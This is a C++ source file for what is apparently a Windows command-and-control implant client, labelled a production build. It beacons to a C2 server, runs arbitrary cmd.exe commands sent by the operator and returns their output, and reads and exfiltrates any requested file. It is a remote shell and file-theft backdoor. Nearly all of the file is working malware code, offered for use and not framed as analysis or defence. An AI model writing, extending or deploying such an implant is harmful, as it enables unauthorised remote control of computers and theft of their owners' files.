// XvX C2 Client - Production Build
// Copyright (c) 2026 - 28zaakypro@proton.me

#include "../include/C2Client.h"
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>

using namespace std;

C2Client *g_c2Client = nullptr;

DWORD WINAPI c2BeaconThread(LPVOID lpParam)
{
    C2Client *c2 = (C2Client *)lpParam;
    c2->setActive(true);

    while (c2->isRunning())
    {
        try
        {
            // Beacon to C2 server
            vector<wstring> commands = c2->checkIn();

            // Execute commands
            for (const wstring &cmdLine : commands)
            {
                size_t pos = cmdLine.find(L'|');
                wstring cmd = (pos == wstring::npos) ? cmdLine : cmdLine.substr(0, pos);
                wstring args = (pos == wstring::npos) ? L"" : cmdLine.substr(pos + 1);
                wstring result;

                if (cmd == L"shell")
                {
                    wchar_t buffer[4096];
                    wstring cmdExec = wstring(L"cmd.exe") + L" /c " + args;
                    FILE *pipe = _wpopen(cmdExec.c_str(), L"r");
                    if (pipe)
                    {
                        wstring output;
                        while (fgetws(buffer, 4096, pipe))
                            output += buffer;
                        _pclose(pipe);
                        result = L"SHELL|" + output;
                    }
                    else
                    {
                        result = L"ERROR|Failed to execute command";
                    }
                }
                else if (cmd == L"exfil")
                {
                    // Convert path encoding
                    int len = WideCharToMultiByte(CP_UTF8, 0, args.c_str(), -1, NULL, 0, NULL, NULL);
                    string pathUtf8(len, 0);
                    WideCharToMultiByte(CP_UTF8, 0, args.c_str(), -1, &pathUtf8[0], len, NULL, NULL);

                    ifstream file(pathUtf8, ios::binary);
                    if (file)
                    {
                        stringstream buffer;
                        buffer << file.rdbuf();
                        string dataA = buffer.str();
                        wstring data(dataA.begin(), dataA.end());
                        result = L"EXFIL|" + data;
                    }
                    else
                    {
                        result = L"ERROR|File not found: " + args;
                    }
                }
                // Beacon interval
                else if (cmd == L"sleep")
                {
                    DWORD seconds = (DWORD)_wtoi(args.c_str());
                    c2->setBeaconInterval(seconds);
                    result = L"SUCCESS|Beacon interval set to " + args + L" seconds";
                }
                else if (cmd == L"die")
                {
                    result = L"SUCCESS|Agent terminating...";
                    c2->sendResult(cmd, L"success", result);
                    c2->setActive(false);
                    break;
                }
                else if (cmd == L"ping")
                {
                    result = L"SUCCESS|PONG";
                }
                else
                {
                    result = L"ERROR|Unknown command: " + cmd;
                }
                c2->sendResult(cmd, L"success", result);
            }

            Sleep(c2->getBeaconInterval() * 1000);
        }
        catch (exception &e)
        {
            Sleep(30000);
        }
    }

    return 0;
}

int main()
{
    // C2 server URL
    wstring c2ServerUrl = L"https://127.0.0.1:8443";

    // Initialize client
    try
    {
        g_c2Client = new C2Client(c2ServerUrl);

        // Start beacon thread
        HANDLE hBeaconThread = CreateThread(NULL, 0, c2BeaconThread, g_c2Client, 0, NULL);
        if (hBeaconThread)
        {
            // Wait for thread
            WaitForSingleObject(hBeaconThread, INFINITE);
            CloseHandle(hBeaconThread);
        }
        else
        {
            return 1;
        }

        // Cleanup
        delete g_c2Client;
        g_c2Client = nullptr;
    }
    catch (exception &e)
    {
        return 1;
    }

    return 0;
}
